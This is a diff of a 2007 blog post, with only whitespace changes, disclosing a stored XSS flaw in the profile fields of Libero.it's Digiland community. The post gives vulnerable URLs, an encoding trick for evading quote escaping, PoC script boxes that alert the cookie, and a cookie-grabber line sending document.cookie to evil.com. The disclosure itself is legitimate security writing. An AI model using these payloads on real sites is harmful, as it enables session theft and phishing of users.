@@ -13,14 +13,12 @@
   var _gaq = _gaq || [];
   _gaq.push(['_setAccount', 'UA-74632-8']);
   _gaq.push(['_trackPageview']);
-
   (function() {
     var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
     ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
     var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
   })();
 </script>
-
   </head>
   <body>
     <header>
@@ -40,53 +38,40 @@
 <p>After the report of Rosario Valotta on this ML, another XSS vulnerability
 has been found on Libero.it, one of the most important italian ISP
 (www.libero.it).</p>
-
 <p>Nothing more than a trivial error but, since Libero.it staff used the
 printed media to inform that it was only a &ldquo;spot&rdquo; issue, it is
 important to demonstrate that this kind of errors are quite more
 widespread and to let the Libero staff and management realize that a
 potential attack
 must be avoid by a deep check of the portal.</p>
-
 <p>The vulnerability once again can be found in the &ldquo;Community&rdquo; section
 of Libero portal, and the affected functionality is the profile
 creation and retrival
 <a href="http://digiland.libero.it/profilo.phtml?nick=XssForFun&amp;top=1">http://digiland.libero.it/profilo.phtml?nick=XssForFun&amp;top=1</a>.</p>
-
 <p>The implementation of this functionality allows the injection of
 malicious code in the profile, so that an attacker by visiting his/her
 profile can:</p>
-
 <p>1) steal username
 2) steal cookies
 3) arbitrary redirection for Phishing pourpose</p>
-
 <p>The normal URL would be something linke this:</p>
-
 <pre>
 http://digiland.libero.it/profilo.phtml?nick=Nick&amp;top=1
 </pre>
-
 <p>where &ldquo;Nick&rdquo; is the name of the nick whose profile has been
 manipulated to add arbitrary code.</p>
-
 <p>This vulnerability resemble to those in MySpace and other communities.
 So it&rsquo;s nothing really complicated and you can skip on from here ;)</p>
-
 <p>In admin pages (need to be logged by creating a fake account) on page</p>
-
 <pre>
 http://digiland.libero.it/profilo_add.php?nocache=1175076655
 </pre>
-
 <p>there are two different fields named &ldquo;I miei difetti:&rdquo; (my defects)
 and &ldquo;i miei pregi:&rdquo; (my strong points) that accept arbitrary content.</p>
-
 <p>As stated by Rosario, the Libero.it web application performs a simple
 parsing of the posted content, so that quote and double-quote (&lsquo; and &ldquo;)
 chars are escaped by putting a \ before of them (both using ASCII and URL
 encoding).</p>
-
 <p>While I already had the Rosario&rsquo;s beautiful implementation of a simple
 evasion technique I preferred to encode the single char in an old
 snippet of mine.
@@ -97,30 +82,23 @@ Due to the limitation in size, the function which create the
 String.fromCharCode sequence is a detached and ascii value is
 decreased of 100 to limit the number of digits.
 This is the creation snippet:</p>
-
 <pre>
  &lt;script&gt;
  var toBenc = "hettp://www.lastknight.com";
  var result = "";
-
   for (var k = 0; k &lt; carlo.length; k++)
  {
          result += ("e(" + (toBenc .charCodeAt(k) - 100) + ")+");
  }
-
  document.write(result + "<br />")
  &lt;/script&gt;
 </pre>
-
 <p>So URL &ldquo;http://www.lastknight.com&rdquo; is rendered as:</p>
 <pre>
 e(4)+e(16)+e(16)+e(12)+e(-42)+e(-53)+e(-53)+e(19)+e(19)+
 e(19)+e(-54)+e(8)+e(-3)+e(15)+e(16)+e(7)+e(10)+e(5)+e(3)+
 e(4)+e(16)+e(-54)+e(-1)+e(11)+e(9);
-
-
 Using the tho box we can use the following code for a POC:
-
 <pre>
 [BOX 1]
  &lt;script&gt;
@@ -129,7 +107,6 @@ Using the tho box we can use the following code for a POC:
  }
  alert(document.cookie);
   &lt;/script&gt;
-
  [BOX 2]
  &lt;script&gt;
  var k =
@@ -141,19 +118,15 @@ Using the tho box we can use the following code for a POC:
   &lt;/script&gt;
 </pre>
   
-
 The posting url can be easily modified to an http grabber such as:  
-
 <pre>
 http://evil.com/grab?c="+encodeURI(document.cookie);
 </pre>
-
 or (much more dangerous) to a phishing site.  
   
 Session Riding and derived problems have not been tested.  
   
 A POC url is available (until not deleted) here:
-
 [http://digiland.libero.it/profilo.phtml?nick=XssForFun&amp;top=1]  
   
 Just my 2 cents and thanks to:    
@@ -164,8 +137,6 @@ Just my 2 cents and thanks to:
 **Vokda**:  for consultancy and typo-killing ;)  
  
 </pre>
-
-
 <h2>Articoli (forse) correlati</h2>
 <ul>
   
@@ -180,7 +151,6 @@ Just my 2 cents and thanks to:
     <li><a href="/2011/08/05/ci-vediamo-al-chaos-communication-camp.html">Ci vediamo al Chaos Communication Camp</a></li>
   
 </ul>
-
 <h2>Articoli recenti</h2>
 <ul class="posts small">
 	
@@ -195,7 +165,6 @@ Just my 2 cents and thanks to:
     <li><a href="/2011/08/05/ci-vediamo-al-chaos-communication-camp.html">Ci vediamo al Chaos Communication Camp</a> <i>05/08/2011</i></li>
 	
 </ul>
-
 <time class="signoff" datetime="2007-03-28">
   28/03/2007 con tag:
 	
@@ -203,7 +172,6 @@ Just my 2 cents and thanks to:
 	
 </time>
 </article>
-
 <div id="disqus_thread"></div>
 <script type="text/javascript">
     var disqus_shortname = 'mgpf';
@@ -214,7 +182,6 @@ Just my 2 cents and thanks to:
         (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
     })();
 </script>
-
       <footer id="footer">
         
         <img style="position:fixed;z-index:1000;bottom:10px;left:10px" src="/images/mgpf.png">
